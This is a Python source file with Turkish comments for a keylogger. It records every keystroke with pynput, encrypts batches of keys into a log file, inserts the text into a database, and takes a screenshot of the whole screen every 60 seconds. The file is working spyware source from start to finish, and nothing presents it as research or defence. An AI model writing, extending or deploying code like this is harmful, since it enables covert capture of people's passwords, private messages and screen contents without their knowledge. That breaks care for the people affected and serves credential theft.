import os
import time
from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from cryptography.fernet import Fernet
from threading import Timer
from key_manager import load_key
from database import insert_log, insert_screenshot

# Anahtar yükleme
key = load_key()
f = Fernet(key)  # Anahtar üzerinde işlem yapacak Fernet nesnesini oluşturuyoruz

# Log dosyasının yolu
log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
log_file = log_dir + "log.txt"
encrypted_log_file = "log.txt"
keys = []


# Dosya şifreleme
def encrypt_content(content):
    return f.encrypt(content.encode('utf-8'))


# Klavye tuşlarını kaydetme
def on_press(key):
    keys.append(key)
    if len(keys) >= 15:  # 15 tuş basımından sonra kaydet
        write_file(keys)
        keys.clear()


# Tuş basımlarını dosyaya yazma
def write_file(keys):
    log_content = ''
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            log_content += ' '
        elif k.find("enter") > 0:
            log_content += '\n'
        elif k.find("Key") == -1:
            log_content += k
    log_content += f' [{datetime.now()}]\n'

    # Dosyayı şifreleme ve yazma
    encrypted_content = encrypt_content(log_content)
    with open(encrypted_log_file, "ab") as file:
        file.write(encrypted_content)
    # Veritabanına ekleme
    insert_log(log_content)


# Ekran görüntüsü alma ve kaydetme
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = f'screenshot_{int(time.time())}.png'
    screenshot.save(screenshot_path)
    # Veritabanına ekran görüntüsü yolunu ekleme
    insert_screenshot(screenshot_path)


# Zamanlanmış görevler
def job():
    take_screenshot()
    # 60 saniye sonra bir sonraki işlemi planla
    Timer(60, job).start()


# Dinleyici fonksiyonları
with Listener(on_press=on_press) as listener:
    # 60 saniye sonra ilk işlemi planla
    Timer(60, job).start()
    listener.join()
